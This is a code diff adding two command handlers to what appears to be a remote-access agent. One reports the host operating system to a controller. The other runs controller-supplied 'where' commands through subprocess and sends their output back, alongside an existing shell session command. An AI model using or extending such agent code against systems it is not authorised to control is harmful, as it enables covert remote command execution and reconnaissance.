@@ -7,6 +7,7 @@ import getpass
 import ssl
 import time
 import subprocess
+from subprocess import CalledProcessError
 from pathlib import Path
 import socket
 import random
@@ -546,6 +547,23 @@ class LocalAgent:
 
 		if response == '<control> No Command':
 			return None
+		elif response == "os_heritage":
+			if platform.system() == "Darwin":
+				self.postResponse("Mac")
+			else:
+				self.postResponse(platform.system());
+		elif response.startswith("where "):
+			#We want to run the command with a timeout and cache all IO for a single transmission back to controller
+			try:
+				self.postResponse("Attempting search with 10 minute timeout")
+				output = subprocess.check_output(response, stderr=subprocess.STDOUT, timeout=600)
+				self.postResponse(output.decode('utf-8'))
+				self.postResponse("Search complete")
+			except CalledProcessError as e:
+				if(e.returncode == 1):
+					self.postResponse("Search complete with no findings")
+				else:    
+					self.postResponse("Cannot execute command {}".format(e))
 		elif response == "shell":
 			self.currentSessionId = str(self.shellIdCounter)
 			self.shellIdCounter += 1
